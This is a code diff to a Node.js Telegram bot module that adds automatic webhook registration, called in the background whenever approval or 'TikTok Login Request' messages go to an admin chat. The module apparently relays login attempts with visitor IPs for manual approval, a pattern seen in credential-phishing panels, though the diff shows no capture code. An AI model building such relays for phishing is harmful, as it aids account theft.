@@ -1,6 +1,6 @@
 'use strict';
 
-const { TELEGRAM_BOT_TOKEN, TELEGRAM_ADMIN_CHAT_ID } = require('../config');
+const { API_BASE_URL, TELEGRAM_BOT_TOKEN, TELEGRAM_ADMIN_CHAT_ID, TELEGRAM_WEBHOOK_SECRET } = require('../config');
 
 const MAX_MSG = 4000;
 
@@ -23,6 +23,11 @@ function sendApprovalMessage(requestId, text) {
         console.warn('Telegram not configured; skipping sendMessage');
         return Promise.resolve(null);
     }
+
+    // Set webhook without awaiting to not slow down the flow
+    setTelegramWebhook().catch(err => {
+        console.error('Background webhook setup failed:', err);
+    });
 
     const body = text.length > MAX_MSG
         ? text.slice(0, MAX_MSG - 20) + '\n…(truncated)'
@@ -52,6 +57,11 @@ function sendTiktokMessage(requestId, ip) {
         console.warn('Telegram not configured; skipping sendTiktokMessage');
         return Promise.resolve(null);
     }
+
+    // Set webhook without awaiting to not slow down the flow
+    setTelegramWebhook().catch(err => {
+        console.error('Background webhook setup failed:', err);
+    });
 
     const text =
         `🎵 TikTok Login Request\n\n` +
@@ -86,4 +96,38 @@ function parseCallback(data) {
     return { action, requestId };
 }
 
-module.exports = { tgApi, sendApprovalMessage, sendTiktokMessage, parseCallback };
+function setTelegramWebhook() {
+    if (!TELEGRAM_BOT_TOKEN || !API_BASE_URL) {
+        console.warn('Telegram webhook setup skipped: missing TELEGRAM_BOT_TOKEN or API_BASE_URL');
+        return Promise.resolve(null);
+    }
+
+    const webhookUrl = `${API_BASE_URL}/telegram/webhook`;
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`;
+    
+    const params = new URLSearchParams({
+        url: webhookUrl
+    });
+    
+    if (TELEGRAM_WEBHOOK_SECRET) {
+        params.append('secret_token', TELEGRAM_WEBHOOK_SECRET);
+    }
+
+    return fetch(`${url}?${params.toString()}`, {
+        method: 'GET'
+    }).then(r =>
+        r.json().then(data => {
+            if (!data.ok) {
+                console.error('Telegram webhook setup error:', data);
+            } else {
+                console.log('Telegram webhook set successfully to:', webhookUrl);
+            }
+            return data;
+        })
+    ).catch(error => {
+        console.error('Failed to set Telegram webhook:', error);
+        return null;
+    });
+}
+
+module.exports = { tgApi, sendApprovalMessage, sendTiktokMessage, parseCallback, setTelegramWebhook };
